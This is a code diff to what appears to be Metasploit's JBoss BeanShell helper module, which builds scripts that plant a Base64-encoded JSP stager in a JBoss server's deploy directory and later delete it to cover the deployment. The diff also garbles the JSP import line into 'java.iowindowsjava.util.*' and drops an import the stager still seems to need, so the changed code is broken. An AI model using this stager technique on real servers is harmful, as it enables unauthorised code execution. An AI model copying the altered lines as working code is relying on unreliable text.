@@ -21,7 +21,8 @@ module Msf::HTTP::JBoss::BSH
       print_status("Attempting to use '#{p}' as package")
       res = invoke_bshscript(bsh_script, p)
       if !res
-        print_warning("Unable to deploy WAR [No Response]")
+        print_error("Unable to deploy WAR [No Response]")
+        return false
       end
 
       if (res.code < 200 || res.code >= 300)
@@ -49,8 +50,7 @@ module Msf::HTTP::JBoss::BSH
     jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
     fos_var = Rex::Text.rand_text_alpha(8+rand(8))
     stager_jsp = <<-EOT
-<%@page import="java.io.*,
-    java.util.*,
+<%@page import="java.iowindowsjava.util.*,
     sun.misc.BASE64Decoder"
 %>
 <%
@@ -82,7 +82,6 @@ EOT
     #
     # This is neccessary to overcome the size limit for GET/HEAD requests
     stager_bsh_script = <<-EOT
-import java.io.FileOutputStream;
 import sun.misc.BASE64Decoder;
 
 String #{stager_var} = "#{encoded_stager_code}";
@@ -148,7 +147,7 @@ EOT
     res
   end
 	
-	def get_undeploy_stager(app_base, stager_base, stager_jsp_name)
+	def gen_undeploy_stager(app_base, stager_base, stager_jsp_name)
     delete_stager_script = <<-EOT
 String jboss_home = System.getProperty("jboss.server.home.dir");
 new File(jboss_home + "/deploy/#{stager_base + '.war/' + stager_jsp_name + '.jsp'}").delete();
@@ -158,7 +157,7 @@ EOT
 
     delete_stager_script
 	end
-	def get_undeploy_bsh(app_base)
+	def gen_undeploy_bsh(app_base)
     delete_script = <<-EOT
 String jboss_home = System.getProperty("jboss.server.home.dir");
 new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
